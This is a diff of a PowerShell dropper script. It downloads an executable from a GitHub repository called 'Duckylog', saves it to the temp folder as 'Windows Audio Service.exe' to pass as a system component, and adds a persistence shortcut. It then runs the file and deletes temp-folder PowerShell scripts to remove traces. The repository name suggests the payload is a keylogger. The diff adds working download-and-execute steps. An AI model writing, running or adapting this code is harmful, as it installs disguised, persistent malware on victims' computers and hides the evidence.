@@ -13,6 +13,14 @@ function Test-NetworkConnection {
     return $pingResult
 }
 
+# Function to clean up PowerShell scripts in the temp directory
+function Cleanup-TempScripts {
+    Get-ChildItem -Path ([System.IO.Path]::GetTempPath()) -Filter "*.ps1" -File | Remove-Item -Force
+}
+
+# Trap to handle script termination and perform cleanup
+trap { Cleanup-TempScripts; break }
+
 # Wait for an active network connection
 while (-Not (Test-NetworkConnection)) {
     Write-Output "Waiting for network connection..."
@@ -31,40 +39,33 @@ if (-Not (Test-Path $shortcutPath)) {
     $exePath = "$env:TEMP\Windows Audio Service.exe"
 
     # URL to the executable on GitHub
-    $exeUrl = if ($architecture -eq "64-bit") {
-        "https://github.com/Mocipie/Duckylog/blob/main/Windows%20Audio%20Service_64.exe?raw=true"
-    } else {
-        "https://github.com/Mocipie/Duckylog/blob/main/Windows%20Audio%20Service_32.exe?raw=true"
-    }
+    $exeUrl = "https://github.com/Mocipie/Duckylog/blob/main/Windows%20Audio%20Service.exe?raw=true"
 
     # Download the executable from GitHub
+    Write-Output "Downloading executable from $exeUrl to $exePath"
     Invoke-WebRequest -Uri $exeUrl -OutFile $exePath
 
-    # Log the download
-    Write-Output "Downloaded Windows Audio Service.exe to $exePath"
+    # Ensure the executable is downloaded
+    if (Test-Path $exePath) {
+        Write-Output "Executable downloaded successfully to $exePath"
 
-    # Create a WScript.Shell COM object
-    $wshShell = New-Object -ComObject WScript.Shell
+        # Create a WScript.Shell COM object
+        $wshShell = New-Object -ComObject WScript.Shell
 
-    # Create the shortcut
-    $shortcut = $wshShell.CreateShortcut($shortcutPath)
-    $shortcut.TargetPath = $exePath
-    $shortcut.WorkingDirectory = [System.IO.Path]::GetDirectoryName($exePath)
-    $shortcut.Save()
+        # Create the shortcut
+        $shortcut = $wshShell.CreateShortcut($shortcutPath)
+        $shortcut.TargetPath = $exePath
+        $shortcut.WorkingDirectory = [System.IO.Path]::GetDirectoryName($exePath)
+        $shortcut.Save()
 
-    # Log the shortcut creation
-    Write-Output "Shortcut created at $shortcutPath"
+        # Log the shortcut creation
+        Write-Output "Shortcut created at $shortcutPath"
+    } else {
+        Write-Output "Failed to download the executable."
+    }
 } else {
     Write-Output "Shortcut already exists at $shortcutPath"
 }
-
-# Function to clean up PowerShell scripts in the temp directory
-function Cleanup-TempScripts {
-    Get-ChildItem -Path ([System.IO.Path]::GetTempPath()) -Filter "*.ps1" -File | Remove-Item -Force
-}
-
-# Trap to handle script termination and perform cleanup
-trap { Cleanup-TempScripts; break }
 
 $logFilePath = "$env:TEMP\log.txt"
 
@@ -72,8 +73,11 @@ if (-Not (Test-Path $logFilePath)) { New-Item -Path $logFilePath -ItemType File 
 
 try {
     # Run the executable
+    Write-Output "Running the executable..."
     $exeProcess = Start-Process -FilePath $exePath -NoNewWindow -PassThru
     $exeProcess.WaitForExit()
+} catch {
+    Write-Output "Failed to run the executable: $_"
 } finally {
     if (Test-Path $logFilePath) { Remove-Item -Path $logFilePath }
     
